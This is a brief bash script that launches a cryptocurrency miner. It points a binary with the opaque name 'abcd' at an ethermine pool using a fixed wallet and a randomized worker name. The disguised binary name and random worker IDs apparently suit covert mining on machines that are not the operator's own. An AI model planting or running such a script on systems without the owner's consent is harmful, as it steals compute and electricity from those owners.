
#!/bin/bash
POOL=us1.ethermine.org:5555
WALLET=WIN:TCxCjhyFyzH3GUqt2n9wt8zn7WN5arjzCs
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-abhi#0o44-e0mu)
chmod +x abcd
./abcd --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
